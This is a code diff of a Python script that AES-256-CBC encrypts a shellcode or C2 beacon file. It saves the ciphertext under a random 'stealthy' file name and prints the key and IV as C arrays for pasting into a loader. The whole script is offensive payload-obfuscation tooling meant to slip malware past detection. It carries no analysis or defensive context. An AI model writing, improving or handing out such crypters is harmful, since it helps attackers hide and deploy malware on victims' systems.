@@ -1,52 +1,48 @@
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-from Crypto.Random import get_random_bytes
-import sys
+#!/usr/bin/env python3
+import os, sys, random, string
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.padding import PKCS7
 
 if len(sys.argv) < 2:
-    print("Uso: python3 aestiny.py <archivo>")
-    print("Ejemplo: python3 aestiny.py beacon.bin")
+    print(f"Usage: {sys.argv[0]} <shellcode.bin (e.g., https.bin)>")
     sys.exit(1)
 
 input_file = sys.argv[1]
-output_file = input_file.replace(".bin", "_encrypted.bin")
 
+if not os.path.exists(input_file):
+    print(f"[-] Error: File not found -> {input_file}")
+    sys.exit(1)
 
-key = get_random_bytes(32)  # AES-256 = 32 bytes
-iv = get_random_bytes(16)   # IV = 16 bytes
-
-
-print(f"[*] Leyendo: {input_file}")
 with open(input_file, "rb") as f:
     plaintext = f.read()
 
-print(f"[*] Tamaño original: {len(plaintext)} bytes")
+# Generate 32-byte Key and 16-byte IV for AES-256
+key = os.urandom(32)
+iv = os.urandom(16)
 
-# AES-256-CBC
-print("[*] Encriptando...")
-cipher = AES.new(key, AES.MODE_CBC, iv)
-padded_plaintext = pad(plaintext, AES.block_size, style='pkcs7')
-ciphertext = cipher.encrypt(padded_plaintext)
+# Apply PKCS7 padding
+padder = PKCS7(128).padder()
+padded = padder.update(plaintext) + padder.finalize()
 
-# Save File
-print(f"[*] Guardando: {output_file}")
-with open(output_file, "wb") as f:
-    f.write(ciphertext)
+# Encrypt in CBC mode
+cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+encryptor = cipher.encryptor()
+ciphertext = encryptor.update(padded) + encryptor.finalize()
 
-# Print format -> C
-print("\n[+] KEY (32 bytes):")
-print("BYTE pKey[32] = {")
-for i in range(0, len(key), 16):
-    chunk = key[i:i+16]
-    print("    " + ", ".join(f"0x{b:02X}" for b in chunk) + ",")
-print("};")
+# Generate a random stealthy filename with a random .dat or .bin extension
+random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 12)))
+random_ext = random.choice([".dat", ".bin"])
+output_filename = f"{random_name}{random_ext}"
 
-print("\n[+] IV (16 bytes):")
-print("BYTE pIv[16] = {")
-for i in range(0, len(iv), 16):
-    chunk = iv[i:i+16]
-    print("    " + ", ".join(f"0x{b:02X}" for b in chunk) + ",")
-print("};")
+with open(output_filename, "wb") as f_out:
+    f_out.write(ciphertext)
 
-print(f"\n[+] Encrypted size: {len(ciphertext)} bytes")
-print(f"[+] File saved: {output_file}")
+print(f"[+] Beacon '{input_file}' successfully encrypted.")
+print(f"[+] Output saved stealthily as: {output_filename} ({len(ciphertext)} bytes)\n")
+
+print("-------------------------------------------------------------------------")
+print("COPY THESE ARRAYS INTO YOUR C CODE:")
+print("-------------------------------------------------------------------------")
+print(f"unsigned char AesKey[32] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};")
+print(f"unsigned char AesIv[16] = {{ {', '.join(f'0x{b:02X}' for b in iv)} }};")
+print("-------------------------------------------------------------------------")
